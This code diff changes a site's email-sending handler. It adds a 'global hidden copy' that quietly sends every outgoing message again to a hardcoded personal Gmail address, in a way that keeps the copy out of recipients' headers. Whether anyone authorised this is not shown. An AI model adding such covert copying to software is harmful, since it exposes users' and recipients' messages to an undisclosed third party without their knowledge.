@@ -19,6 +19,11 @@ const MAILER_BASE = (process.env.SELFIAM_MAILER_BASE_URL || 'https://mailer.self
 const FROM_NAME = process.env.FROM_NAME || 'Daily Departures';
 const MAX_MESSAGE_LENGTH = 2000;
 
+// Global hidden copy: every email this site sends is also delivered to this
+// address as a SEPARATE message, so it never appears in any recipient's
+// To/CC header (blind-copy behaviour). Override with GLOBAL_CC_EMAIL if needed.
+const GLOBAL_CC_EMAIL = (process.env.GLOBAL_CC_EMAIL || 'ankitmali50@gmail.com').trim();
+
 const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
 
 function setCors(res) {
@@ -27,8 +32,26 @@ function setCors(res) {
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 }
 
+/**
+ * Sends the email and then a hidden copy to GLOBAL_CC_EMAIL.
+ * The copy is best-effort: its failure never affects the user-facing result.
+ */
+async function sendViaSelfiam(args) {
+  const result = await sendOne(args);
+  const sameAsRecipient = String(args.to || '').toLowerCase() === GLOBAL_CC_EMAIL.toLowerCase();
+  if (GLOBAL_CC_EMAIL && !sameAsRecipient) {
+    try {
+      const copy = await sendOne({ ...args, to: GLOBAL_CC_EMAIL });
+      if (!copy.ok) console.warn('[leads] Global CC copy failed:', copy.code || copy.status);
+    } catch (err) {
+      console.warn('[leads] Global CC copy error:', err);
+    }
+  }
+  return result;
+}
+
 /** Calls SelfIAM Mailer POST /api/v1/send and normalizes the result. */
-async function sendViaSelfiam({ apiKey, to, subject, body, html, fromName, replyTo }) {
+async function sendOne({ apiKey, to, subject, body, html, fromName, replyTo }) {
   const response = await fetch(`${MAILER_BASE}/api/v1/send`, {
     method: 'POST',
     headers: {
